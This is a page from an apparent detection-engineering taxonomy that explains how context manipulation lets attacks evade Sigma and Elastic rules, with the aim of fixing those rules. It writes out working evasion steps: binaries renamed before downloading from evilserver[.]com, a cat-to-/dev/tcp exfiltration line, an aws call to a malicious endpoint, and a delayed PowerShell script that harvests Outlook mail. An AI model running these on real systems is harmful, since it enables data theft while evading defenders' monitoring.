# ADE3 Context Development

Context Development bugs occur when an attacker takes additional steps to **manipulate or poison contextual data** used by the detection logic, causing in‑scope activity to bypass rule conditions.  

Rather than changing the primary action, the attacker shapes the surrounding context that the rule relies on.


**ADE3-01 Context Development - Process Cloning**

This occurs when detection logic relies on **string-based identification of a process or binary**, while implicitly assuming the attacker cannot clone or rename binaries.

If the attacker has sufficient privileges to duplicate and rename a binary, they can execute identical behavior under a different process name, resulting in a False Negative.


**ADE3-02 Context Development - Aggregation Hijacking**

This occurs when detection logic relies on **aggregated values** that an attacker can influence or precondition.

Examples include:
- Aggregations over file sizes, file name lengths, or counts
- UEBA-style entities (e.g. `source.ip:user.name`)
- “Newly seen” or threshold-based logic

An attacker may deliberately perform preparatory activity to ensure their behavior aggregates into an existing baseline or remains below alerting thresholds, allowing in-scope activity to proceed undetected.


**ADE3-03 Context Development - Timing and Scheduling**

This occurs when detection logic relies on **time-based assumptions**, such as execution frequency, duration, or inter-event timing.

By spacing, batching, or scheduling actions to avoid inclusion within rule execution windows or aggregation periods, an attacker can bypass detection without changing the underlying behavior.

---


## ADE3-01 Context Development - Process Cloning, Examples


This occurs when detection logic relies on **string-based identification of a process or binary**, while implicitly assuming the attacker cannot clone or rename binaries.

If the attacker has sufficient privileges to duplicate and rename a binary, they can execute identical behavior under a different process name, resulting in a False Negative.


### ADE3-01, Example 1:  [Wget Creating Files in Tmp Directory](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/file_event/file_event_lnx_wget_download_file_in_tmp_dir.yml)

This rule seeks to detect use of wget to download content in a temporary directory such as "/tmp" or "/var/tmp". This was created in response to GobRAT malware by Joseliyo Sanchez and is included as one of mulitple detection rules released their [excellent writeup on GobRAT](https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/) in in May 2023.

The event log that captured this activity was provided in Joseliyo's writeup, as below.
```XML
<Event>
    <System>
        <Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/>
        <EventID>11</EventID>
        <Version>2</Version>
        <Level>4</Level>
        <Task>11</Task>
        <Opcode>0</Opcode>
        <Keywords>0x8000000000000000</Keywords>
        <EventRecordID>16795</EventRecordID>
        <Correlation/>
        <Execution ProcessID="26414" ThreadID="26414"/>
        <Channel>Linux-Sysmon/Operational</Channel>
        <Security UserId="0"/>
    </System>
    <EventData>
        <Data Name="RuleName">-</Data>
        <Data Name="ProcessGuid">{46700b68-ff05-6475-9525-20d06e550000}</Data>
        <Data Name="ProcessId">26571</Data>
        <Data Name="Image">/usr/bin/wget</Data>
        <Data Name="TargetFilename">/tmp/env/.qnapd/apachedtmp</Data>
        <Data Name="User">-</Data>
    </EventData>
</Event>
```
Which shows that wget was called to download into `/tmp/env/*`. 

```SQL
detection:
    selection:
        Image|endswith: '/wget'
        TargetFilename|startswith:
            - '/tmp/'
            - '/var/tmp/'
    condition: selection
```
This rule and others provided by Joseliyo are execellent and very useful for incident resposne and threat hunting. Since May 2023 the rule has been incorporated into base rulesets for linux file events.

#### Rule Bypass 1: Process cloning to evade detection,  Bug subcategory: ADE3-01 Context Development - Process Cloning

GobRAT runs wget when it has access to a compromised account, usually root-level privileges to run loader scripts, etc. JPCERT/CC documented that the loader script would take actions which would require root, such as `/root/.ssh/authorized_keys` or writing to `/etc/profile.d`.

As a rule in response to GobRAT it's very relevant, however, due to the incorporation into main rulesets the focus has shifted to general use of wget writing files to tmp no matter the source. I.e since 2023 there were a few malware which have been confirmed to use wget to download files. Firtsly [wget.sh downloader script in 2025](https://any.run/report/9274a5d4918f0cde068a11587ea2c33f08b7827f022092131c6ffe9ea198024a/ee605dcd-a508-44e1-ab6f-eb89d26797db), and also [exploitation of CVE-2024-38428](https://jfrog.com/blog/cve-2024-38428-wget-vuln-all-you-need-to-know/). So the rule's intended scope birthed from GobRAT malware, but is focused on use of wget to download into tmp.

Process cloning with root permissions (in this case) is easily done by cloning the binary with a different name, to a different file path other than `/tmp`,  prior to executing the in-scope technique. 

In this example the detection rule won’t trigger on the cloning because the detection logic checks `Image|endswith: '/wget'`. In process events the cloning would be `Image|endswith: '/cp'` and in file events it would be file creation with `usr/bin/foo`. At this point in time the activity isn't considered in-scope of the rule by ADE beacause it isn't yet used to downlod a file into `/tmp` or `/var/tmp`.

Now, the attacker knowning the bug in the detection logic might clone the binary to `/usr/bin/foo` and then use `/foo` to download to `/tmp`:
1. `cp ./usr/bin/wget /usr/bin/foo`
2. `/usr/bin/foo -0 /tmp/env/.evil/file "https://evilserver[.]com/path/to/evilfile"`
3. False Negative, no hits with rule.

If the attacker doesn't have root, then they can clone to `/usr/tmp/foo`.

The binary itself is the same as wget and will have the same hash, so ADE considers it to be in-scope of the detection rule. Sometimes, no special permissons are needed to clone a binary into a user's directory then run it.

The contextual development is the addition of the step to clone and rename prior to executing the in-scope technique.

### ADE3-01, Example 2: [Network Activity Detected via cat](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/linux/command_and_control_cat_network_activity)

This rule searches for instances where the execution of the cat command is then followed by a connection attempt by the same process. This is because cat can be utilized to transfer data via tcp/udp channels via redirection of its read output to `/dev/tcp` / `/dev/udp` channels. 

Attackers may use this technique to transfer artifacts to another host in the network or exfiltrate data.

The relevant portion of the EQL rule is as follows:
```SQL
sequence by host.id, process.entity_id with maxspan=3s
  [process where host.os.type == "linux" and event.type == "start" and event.action == "exec" and
   process.name == "cat" and process.parent.name in ("bash", "dash", "sh", "tcsh", "csh", "zsh", "ksh", "fish")]
  [network where host.os.type == "linux" and event.action in ("connection_attempted", "disconnect_received") and
   process.name == "cat" and not (
     destination.ip == null or destination.ip == "0.0.0.0" or cidrmatch(
       destination.ip, "10.0.0.0/8", "127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/12", "192.0.0.0/24", "192.0.0.0/29",
       "192.0.0.8/32", "192.0.0.9/32", "192.0.0.10/32", "192.0.0.170/32", "192.0.0.171/32", "192.0.2.0/24",
       "192.31.196.0/24", "192.52.193.0/24", "192.168.0.0/16", "192.88.99.0/24", "224.0.0.0/4", "100.64.0.0/10",
       "192.175.48.0/24","198.18.0.0/15", "198.51.100.0/24", "203.0.113.0/24", "240.0.0.0/4", "::1", "FE80::/10",
       "FF00::/8"
     )
   )]
```

The atomic to this may be `cat file > /dev/tcp/host/port` which would cause bash to try open a tcp connection to the remote host:port, streaming the file to the remote endpoint if the connection is successful.

#### Rule Bypass 1: Process cloning to evade detection,  Bug subcategory: ADE3-01 Context Development - Process Cloning

Just like the previous example, an attacker with access to bash and cat does not need root to establish this activity (nor any special capability). 

1. `cp /bin/cat /usr/tmp/foo`
2. `foo file > /dev/tcp/evilhost/port`

The attacker takes an additional step (1.) to set the context, with the intention to poison the data and generate a False Negative in the second in-scope step.


### ADE3-01, Example 3:  [AWS CLI Command with Custom Endpoint URL](https://github.com/elastic/detection-rules/blob/main/rules/linux/command_and_control_aws_cli_endpoint_url_used.toml)

This rule searches for the use AWS CLI with a "--endpoint-url" argument which allows users to specify a custom endpoint URL for AWS services. The action can be leveraged by attackers to redirect API requests to malicious endpoints for C2 or exfiltration.

The relevant part of the detection logic.
```
query = '''
host.os.type:"linux" and event.category:"process" and
event.action:("exec" or "exec_event" or "executed" or "process_started" or "ProcessRollup2") and
process.name:"aws" and process.args:"--endpoint-url"
'''
```

The command to generate this hit would be `aws s3 ls --endpoint-url https://custom-s3-endpoint[.]evil[.]com` 

#### Rule Bypass 1: Process cloning to evade detection,  Bug subcategory: ADE3-01 Context Development - Process Cloning

Again, like the above examples, the contextual development is a process clone.

1. `cp /usr/bin/aws /usr/tmp/foo`
2. `/usr/tmp/foo s3 ls --endpoint-url https://custom-s3-endpoint[.]evil[.]com s3 ls`

These examples are how False Negatives can be generated by adding a simple process cloning step prior to undertaking the action that the detection rule searches for.



## ADE3-02 Context Development - Aggregation Hijacking, Examples

This occurs when detection logic relies on **aggregated values** that an attacker can influence or precondition.

Examples include:
- Aggregations over file sizes, file name lengths, or counts
- UEBA-style entities (e.g. `source.ip:user.name`)
- “Newly seen” or threshold-based logic

An attacker may deliberately perform preparatory activity to ensure their behavior aggregates into an existing baseline or remains below alerting thresholds, allowing in-scope activity to proceed undetected.

It also occurs when the rule aggregates the logs into a UEBA entity such as `source.ip:user.name` combination and flags the activity if not present over a certain time period. Depending on the present assumptions of the rule, and the current baseline in the environment, an attack can specifically target cases where they can undertake activity to gather information to assess whether or not they will be aggregated into an existing baseline which won’t be flagged. This bug sub-category mostly occurs in thresholds, new terms rules, or ‘newly seen X’ based logic coupled with compromised valid accounts.  

#### ADE3-02, Example 1:  [Ingress Transfer via Windows BITS](https://github.com/elastic/detection-rules/blob/main/rules/windows/command_and_control_ingress_transfer_bits.toml)

Recall that this example was given in [ADE2-04 Omit Alternatives - File Type](ADE2_Omit_Alternatives.md) due to a bug in file type omissions. This actually holds another detection logic bug.

This is a detection rule in Elastic Endgame EDR, of query type Elastic Query Language (EQL). The query section is below.
```SQL
query = '''
file where host.os.type == "windows" and event.action == "rename" and
  process.name : "svchost.exe" and file.Ext.original.name : "BIT*.tmp" and 
  (file.extension : ("exe", "zip", "rar", "bat", "dll", "ps1", "vbs", "wsh", "js", "vbe", "pif", "scr", "cmd", "cpl") or
   file.Ext.header_bytes : "4d5a*") and 
 
  /* noisy paths, for hunting purposes you can use the same query without the following exclusions */
  not file.path : ("?:\\Program Files\\*", "?:\\Program Files (x86)\\*", "?:\\Windows\\*", "?:\\ProgramData\\*\\*") and 
 
  /* lot of third party SW use BITS to download executables with a long file name */
  not length(file.name) > 30 and
  not file.path : (
        "?:\\Users\\*\\AppData\\Local\\Temp*\\wct*.tmp",
        "?:\\Users\\*\\AppData\\Local\\Adobe\\ARM\\*\\RdrServicesUpdater*.exe",
        "?:\\Users\\*\\AppData\\Local\\Adobe\\ARM\\*\\AcroServicesUpdater*.exe",
        "?:\\Users\\*\\AppData\\Local\\Docker Desktop Installer\\update-*.exe"
  )
'''
```
#### Rule Bypass 2: Manipulating file name to invert conjuncted negations,  Bug subcategory: ADE3-01 Context Development - Aggregation Hijacking, and ADE4-01 Logic Manipulation - Gate Inversion.
This is rule bypass 2, because the first was related to file type omission.

Based on [De Morgan’s Laws](https://en.wikipedia.org/wiki/De_Morgan%27s_laws) the `not length(file.name) > 30 and not ... `  component of the detection logic relies on the file length condition to be true (i.e it's not) in order to utilize the remaining excluding conditions. This means that detection logic can have it's outcome inverted when the file.name length is greater than 30.

In windows, filenames have a 255 character limit. If the filename is greater than 30, such as `xv7qmw2p9z4adr1fks83ntc0bhy6lu5.exe` then the detection logic will return `false` when ` not length(file.name) > 30` is executed.

Here, the stacking of two (or three with the ADE2-03 used) bugs can lead to the generation of multiple False Negatives, which can be abused by an attacker.


#### ADE3-02, Example :  [AWS CLI Command with Custom Endpoint URL](https://github.com/elastic/detection-rules/blob/main/rules/linux/command_and_control_aws_cli_endpoint_url_used.toml)


Recall above, in ADE3-01, Example 3, this rule searches for the use AWS CLI with a "--endpoint-url" argument which allows users to specify a custom endpoint URL for AWS services. The action can be leveraged by attackers to redirect API requests to malicious endpoints for C2 or exfiltration.

The relevant part of the detection logic.
```SQL
query = '''
host.os.type:"linux" and event.category:"process" and
event.action:("exec" or "exec_event" or "executed" or "process_started" or "ProcessRollup2") and
process.name:"aws" and process.args:"--endpoint-url"
'''
```

It was noted above that a False Negative/Rule Bypass to this was adding a simple process cloning step prior to undertaking the action that the detection rule searches for.

In the detection logic, the outputs of the quert hits are grouped into what Elastic secuirty calls 'new terms'. 
```yaml
type = "new_terms"  // <- this portion here denotes a new terms type rule in Elastic security.
timestamp_override = "event.ingested"
```
and the following related parameters,..
```yml
[rule.new_terms]
field = "new_terms_fields"
value = ["host.id"]

[[rule.new_terms.history_window_start]]
field = "history_window_start"
value = "now-3d"
```
means that at every rule execution, the last 3d worth of outputted data is grouped per `host.id`, then when the output of the current scheduled runtime is not observed to be in that, it will output a hit with the `host.id` as the term in the alert.

New terms aggregation hijacking is not guarenteed every time, and is purely dependent on the context that an attacker finds themselves within.

#### False Negative situations

***Existing history of `aws` usage***

A **non-root user** (e.g if this is a compromised account that is trying to run `aws`  illegitimately) can check .bash_history `cat ~/.bash_history | grep aws` for recent command line activity using `aws` by the user they've compromised, but not others. If the output shows recent use, and history isn't flushed yet, then the attacker may be able to hijack the aggregation. The new terms rule groups by `host.id` so there's possibility to hijack the aggregation if there is no output from user history, and if they see that `aws` is already installed. This is not a definite False Negative.

With **root** the context is different. In order for this host to sends logs for the detection rule to search on, it must have logging enabled. Therefore, it is reasonable to assume that the attacker with root can view all EXECVE messages in the last 3 days (including some journalctl visibility), some information in `/proc/*` may be present pointing to `aws`, and all shell usage of all users. With this context, if an attacker can find an example of a hit in the last 3 days, they will be able to asertain that repeat use of aws with the `--endpoint-url` argument will be included into the new terms aggregation and not result in a hit. 

This would be an example of **ADE3-02 Context Development - Aggregation Hijacking** as the attacker is developing the context they are in, in order to abuse a bug in the detection logic. The bug being a new terms field list that's too abstract.

***When `aws` doesn't exist***

A host that doesn't have the binary pre-existing requires an attacker to aim to use ADE3-01 Context Development - Process Cloning to clone/copy wget or curl, to bypass rules relating to wget/curl to download files and also unzip them into the compromised account's home directory (no need for root). Then, after `chmod `ing the user's owned binary, it can be used to generate seemingly legitimate aws usage by using a bogus endpoint such as `https://configsnapshot-s3-endpoint[.]<TARGETS_LEGIT_DOMAIN>[.]com` (or even `8.8.8.8`, no need for it to work) in order to mimick a legitimate endpoint in the hit. This would require generating a hit with a bogus endpoint and hoping for the SOC to incorrectly triage it as a False Positive (which is possible seeing no other alerts and seeing the customer's legitimate domain being visited by an internal host), then waiting the outcome of the triage.

This would be an example of *Behavioral Steering* abuse, mentioned in [Detection Logic Bug Theory](Detection_Logic_Bug_Theory.md) Attacker adapts their own activity by stacking multiple detection rule bugs during the a kill chain.


**But, this is still not definitive and purely circumstantial on the context present in the compromised host.**

This is absolutely correct. In **ADE3-02 Context Development - Aggregation Hijacking**, if the bug relates to a new terms type aggregation, it is not always guareenteed that the bug can be abused. It is highly depended on the context of the resources, this is why it's considered context development. The bug itself is in the *design* of the detection logic as it relies on too few terms for it's aggregation and/or assumes that each entity being aggregated doesn't have lower level uniqueness which could be used by the detection logic to reduce False Negatives. A fix in the example above would focus on the user account as well as the endpoint that is being used in the query.

**But, a compromised account with root can disable logging**.

This is also correct, but the drop in a heartbeat or logging should be a quick notification to a SOC that there is an issue present, due to existing MITRE ATT&CK TTPs relating to logging disablement [T1548](https://attack.mitre.org/techniques/T1548). The detection logic bug cannot be abused without logs being generated to search over. Disabling logging bypasses search, but doesn't abuse a bug in detection logic, which is what ADE formalizes (bugs in detection logic).

#### ADE3-02, Example 3: [First Time Seen Commonly Abused Remote Access Tool Execution](https://github.com/elastic/detection-rules/blob/f6e79944f2fd0ad680cb2e68fd249c8b6d722ec8/rules/windows/command_and_control_new_terms_commonly_abused_rat_execution.toml)

This Elastic Security New Terms rule searches for cases when a process is started whose name or code signature resembles commonly abused RATs. To indicating the host has not seen this RAT process started before within the last 30 days.

##### False Negatives

In this example, the bug is very similar to the previous expect instead of Linux, it's Windows, and instead of `aws` it's a Remote Management Tool process being searched for. 

```SQL
query = '''
host.os.type: "windows" and

   event.category: "process" and event.type : "start" and

    (
    process.code_signature.subject_name : (
        TeamViewer* or "NetSupport Ltd" or "GlavSoft" or "LogMeIn, Inc." or "Ammyy LLC" or
        "Nanosystems S.r.l." or "Remote Utilities LLC" or "ShowMyPC" or "Splashtop Inc." or
        "Yakhnovets Denis Aleksandrovich IP" or "Pro Softnet Corporation" or "BeamYourScreen GmbH" or
        "RealVNC" or "uvnc" or "SAFIB") or

    process.name.caseless : (
        "teamviewer.exe" or "apc_Admin.exe" or "apc_host.exe" or "SupremoHelper.exe" or "rfusclient.exe" or
        "spclink.exe" or "smpcview.exe" or "ROMServer.exe" or "strwinclt.exe" or "RPCSuite.exe" or "RemotePCDesktop.exe" or
        "RemotePCService.exe" or "tvn.exe" or "LMIIgnition.exe" or "B4-Service.exe" or "Mikogo-Service.exe" or "AnyDesk.exe" or
        "Splashtop-streamer.exe" or AA_v*.exe, or "rutserv.exe" or "rutview.exe" or "vncserver.exe" or "vncviewer.exe" or
        "tvnserver.exe" or "tvnviewer.exe" or "winvnc.exe" or "RemoteDesktopManager.exe" or "LogMeIn.exe" or ScreenConnect*.exe or
        "RemotePC.exe" or "r_server.exe" or "radmin.exe" or "ROMServer.exe" or "ROMViewer.exe" or "DWRCC.exe" or "AeroAdmin.exe" or
        "ISLLightClient.exe" or "ISLLight.exe" or "AteraAgent.exe" or "SRService.exe")
	) and

	not (process.pe.original_file_name : ("G2M.exe" or "Updater.exe" or "powershell.exe") and process.code_signature.subject_name : "LogMeIn, Inc.")
'''

...

[rule.new_terms]
field = "new_terms_fields"
value = ["host.id"]
[[rule.new_terms.history_window_start]]
field = "history_window_start"
value = "now-15d"
```
There are a few considerations, but the context needs to match the following in order for it to be developed into a False Negative:
- the new term is the `host.id`, so all accounts are bundled into the terms bucket as a single instance.
- (if) an attacker can view processes avaliable in SYSTEM owned directories to see if a RAT is installed already.
- the rule kill chain stage assumes a compromised user account, (if) they can get the contents of Recent Items folder to get the `.lnk` files to figure out when an existing RAT was last run. (if) less than 15 days can bypass due to the new term period.
- non local admin user can read contents in `%APPDATA%\Microsoft\Windows\Recent\` in thier own account (not others)
- Admin can read all users `%APPDATA%\Microsoft\Windows\Recent\`

There is also a different between where `process.name.caseless` and `process.pe.original_file_name`are used in the detection logic. The latter is an immutable value, so better for robust detections. This may also indicate a potential **ADE3-01 Context Development - Process Cloning** Bug in the detection logic, as `process.name.caseless` takes the name of the executable actually ran (a renamed copy would have it's new name here).

---

## ADE3-03 Context Development - Timing and Scheduling, Examples

This occurs when detection logic relies on **time-based assumptions**, such as execution frequency, duration, or inter-event timing.

By spacing, batching, or scheduling actions to avoid inclusion within rule execution windows or aggregation periods, an attacker can bypass detection without changing the underlying behavior.


### ADE3-03 Example 1: [Collection Email Outlook Mailbox Via Com](https://github.com/elastic/detection-rules/blob/main/rules/windows/collection_email_outlook_mailbox_via_com.toml)

This Elastic Query Language sequence rule, looks for cases where the a process starts and uses the Component Object Model to communicate with Outlook. This is because an attacker may target email accounts to collect sensitive information or send an email on behalf using the API endpoints.

A sequence rule runs as a state machine which can be contrained to a timespan (that is `maxspan`), so that all matching records within that timespan must be present for a hit to occur ([sequence syntax reference](https://www.elastic.co/docs/reference/query-languages/eql/eql-syntax)). The `from = "now-9m" ` sets the range of a lookback period, to allow for the inclusion of records whose ingest was delayed less than 9+ minutes.

The relevant section of the detection logic is below.

```SQL
from = "now-9m"
....
sequence with maxspan=1m
[process where host.os.type == "windows" and event.action == "start" and
  (
    process.name : (
      "rundll32.exe", "mshta.exe", "powershell.exe", "pwsh.exe",
      "cmd.exe", "regsvr32.exe", "cscript.exe", "wscript.exe"
    ) or
    (
      (process.code_signature.trusted == false or process.code_signature.exists == false) and
      (process.Ext.relative_file_creation_time <= 500 or process.Ext.relative_file_name_modify_time <= 500)
    )
  )
] by process.entity_id
[process where host.os.type == "windows" and event.action == "start" and process.name : "OUTLOOK.EXE" and
  process.Ext.effective_parent.name != null] by process.Ext.effective_parent.entity_id
```

When this is exected, it builds a state machine that searches over 1m blocks. All states must be achieved in order for a hit to occur, as specified in the syntax reference above. In order for a state machine to have flow, each consequtive state must occur after the prior.
- State 1: A windows host start event is for either one of the listed `process.name` OR it's both a) untrusted OR missing a signature AND b) was created or modified less than 501 seconds before the start event
- State 2:: A windows host start event is for a process called "OUTLOOK.EXE" AND the parent process id exists.

Entity grouping then occurs on the process id from State 1 and also the parent process id from State 2, like a join, in order to identiy which process is causing 

In the detection rule a reference is given to an archived CALDERA payload [evals/payloads/stepSeventeen_email.ps1](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/apt29/Archive/CALDERA_DIY/evals/payloads/stepSeventeen_email.ps1), this was part of an evaluation set to mimick APT29, Russian government attributed threat group.
```PS
function psemail {
	Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null
	$olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type]
	$outlook = new-object -comobject outlook.application
	$namespace = $outlook.GetNameSpace("MAPI")
	$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox)
	$folder.items | Select-Object -Property Subject, ReceivedTime, SenderName, Body
}
```
The detection logic itself is flagging on any case where one of the listed `process.name` creates `outlook.EXE` process, regardless of activity. This detection rule is a great example of how a detection rule can have multiple detection logic bugs.

#### Bug 1, ADE3-01 Context Development - Process Cloning
The field `process.name` is mutable, as discussed above. So there detection logic has a process cloning bug present if it is not ran within 500 seconds.

Milliseconds VS seconds? Because there is no public documentation ADE assumes it's in seconds because:
1. The intention of the use of the enrichment field is to catch recent activity prior prcess creation, and
2. Milliseconds would be too narrow of a view in practice, due to latencies that may be present across different hosts,
3. Although the two inputted timestamps are in milliseconds, assuming the larger of the two is the safest bet with False Negatives (as a False Negative example to seconds would also worl with milliseconds)

#### Bug 2, ADE3-03 Context Development - Timing and Scheduling

The first timing and scheduling related bug has to do with file metadata that's utilized in the detection logic. The fields `process.Ext.relative_file_creation_time` and `process.Ext.relative_file_name_modify_time` are custom enrichment fields created by Elastic Endgame. 
The relevant line.
```SQL
and
      (process.Ext.relative_file_creation_time <= 500 or process.Ext.relative_file_name_modify_time <= 500)

```

Although there is no documentation on the field or related ingest pipeline, a detection engineer can confidently assume that:
- `process.Ext.relative_file_creation_time` = process created time - process file creation time (seconds)
- `process.Ext.relative_file_name_modify_time` = file last modification time - process creation time (seconds)
due to the limited time fields available to use in the OS records.

An attacker may be able to create the file to be ran, then wait longer that 500 seconds prior to running it. Both fields would have a value greater that 500, regardless of second or millisecond unit. To utilize that, an attacker would have to ensure the file has an untrusted signature or a signatures not existing, which is commonly seen in practice.


#### Bug 3, ADE3-03 Context Development - Timing and Scheduling 


As discussed previously, in order for a sequence rule to generate a hit within the maxspan, all states must be satisfied within the maxspan. In this example the maxspan is 60 seconds. An attacker would be able to create process creation event that waits more than 60 seconds before interacting with COM.

An attacker can manipulate the timing between when the powershell script starts and when the process event log is created for `outlook.exe` by making this greater than 60 seconds, say 120 seconds, the span of the sequence rule will be too short and the flow between states will not occur. This is seen in the modified atomic below.

```PS
function false_negative_psemail {
	Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null
	$olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type]
  
  Start-Sleep -Seconds 120   # This is the ADE3-03 bug abuse, create the parent proces outside of the maxspan of it's child.

	$outlook = new-object -comobject outlook.application
	$namespace = $outlook.GetNameSpace("MAPI")
	$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox)
	$folder.items | Select-Object -Property Subject, ReceivedTime, SenderName, Body
}
```

The lookback period checks for newly seen data that should have been ingested at the previous time buckets. The old creation event of `outlook.exe` process is not considered a delayed ingest, so would be included in the maxspan set now-120 seconds ago.


#### Bug 4, ADE3-02 Context Development - Aggregation Hijacking

Outlook itself is a single instace COM local server, meaning, that if it is already running, then it has registered itself in COM. When powershell calls `outlook.application` COM returns a mapping to the existing instance instead of launching a new process. 

If `outlook.exe` is not running prior to this, then there will be a process creation event when the atomic is ran. If outlook is already running, then the process creation event has already occurred (and been ingested) so no parent process event field will be logged when powershell connects to the already running COM instance (regardless of Sysmon 1 or winevent 4688 being used to generate `event.action` as `"start"`).

An attacker with the ability to create a file and run it would likely also have the ability to see currently running processes. They can either use the fact that `outlook.exe` is already running, or they can launch it themselves legitimately, wait, then use that existing process to create a False Negative. Both of these actions develop the context of the host in order to hijack the aggregation or the rule (the aggregation being the grouping of the process ids, as the action voids the generation of one).

By now, you may be thinking "how often does Elastic Endgame rely on `process.Ext.relative_file_creation_time` or `process.Ext.relative_file_name_modify_time`"?. ADE will not outline this exactly as it's about improving bugs, although this is an intriguing question which may bring a suprising answer to the reader if they investiagte it themselves.


---

**Contents**
- [README.md](README.md)
- [Detection Logic Bug Theory](Detection_Logic_Bug_Theory.md)
- [Detection Logic Bug Taxonomy](Detection_Logic_Bug_Taxonomy.md)
- [ADE1 Reformatting in Actions](ADE1_Reformatting_in_Actions.md)
- [ADE2 Omit Alternatives](ADE2_Omit_Alternatives.md)
- **ADE3 Context Development (Current Page)**
- [ADE4 Logic Manipulation](ADE4_Logic_Manipulation.md)
- [Bug Likelihood Test](Bug_Likelihood_Test.md)
- [LICENCE](LICENSE)



